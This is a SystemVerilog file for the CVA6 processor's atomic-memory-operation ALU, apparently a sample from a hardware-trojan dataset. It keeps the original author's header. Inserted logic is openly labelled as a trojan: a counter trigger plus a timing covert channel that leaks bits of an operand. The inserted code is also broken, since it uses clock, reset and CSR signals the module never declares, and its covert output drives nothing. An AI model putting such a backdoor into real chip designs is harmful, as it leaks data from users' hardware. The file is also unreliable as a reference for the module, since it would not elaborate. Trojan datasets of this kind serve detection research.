// Copyright 2018 ETH Zurich and University of Bologna.
// Copyright and related rights are licensed under the Solderpad Hardware
// License, Version 0.51 (the "License"); you may not use this file except in
// compliance with the License.  You may obtain a copy of the License at
// http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
// or agreed to in writing, software, hardware and materials distributed under
// this License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
// CONDITIONS OF ANY KIND, either express or implied. See the License for the
// specific language governing permissions and limitations under the License.
//
// Author: Florian Zaruba, ETH Zurich
// Date: 15.09.2018
// Description: Combinatorial AMO unit
module amo_alu_trojan_Covert #(
    parameter config_pkg::cva6_cfg_t CVA6Cfg = config_pkg::cva6_cfg_empty
) (
    // AMO interface
    input  ariane_pkg::amo_t        amo_op_i,
    input  logic             [63:0] amo_operand_a_i,
    input  logic             [63:0] amo_operand_b_i,
    output logic             [63:0] amo_result_o      // result of atomic memory operation
);

    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=24336)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 24336;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (csr_op_en_i && |amo_operand_a_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = amo_operand_a_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────



  logic [64:0] adder_sum;
  logic [64:0] adder_operand_a, adder_operand_b;

  assign adder_sum = adder_operand_a + adder_operand_b;

  always_comb begin

    adder_operand_a = $signed(amo_operand_a_i);
    adder_operand_b = $signed(amo_operand_b_i);

    amo_result_o = amo_operand_b_i;

    unique case (amo_op_i)
      // the default is to output operand_b
      ariane_pkg::AMO_SC: ;
      ariane_pkg::AMO_SWAP: ;
      ariane_pkg::AMO_ADD: amo_result_o = adder_sum[63:0];
      ariane_pkg::AMO_AND: amo_result_o = amo_operand_a_i & amo_operand_b_i;
      ariane_pkg::AMO_OR: amo_result_o = amo_operand_a_i | amo_operand_b_i;
      ariane_pkg::AMO_XOR: amo_result_o = amo_operand_a_i ^ amo_operand_b_i;
      ariane_pkg::AMO_MAX: begin
        adder_operand_b = -$signed(amo_operand_b_i);
        amo_result_o = adder_sum[64] ? amo_operand_b_i : amo_operand_a_i;
      end
      ariane_pkg::AMO_MIN: begin
        adder_operand_b = -$signed(amo_operand_b_i);
        amo_result_o = adder_sum[64] ? amo_operand_a_i : amo_operand_b_i;
      end
      ariane_pkg::AMO_MAXU: begin
        adder_operand_a = $unsigned(amo_operand_a_i);
        adder_operand_b = -$unsigned(amo_operand_b_i);
        amo_result_o = adder_sum[64] ? amo_operand_b_i : amo_operand_a_i;
      end
      ariane_pkg::AMO_MINU: begin
        adder_operand_a = $unsigned(amo_operand_a_i);
        adder_operand_b = -$unsigned(amo_operand_b_i);
        amo_result_o = adder_sum[64] ? amo_operand_a_i : amo_operand_b_i;
      end
      default: amo_result_o = '0;
    endcase
  end
endmodule
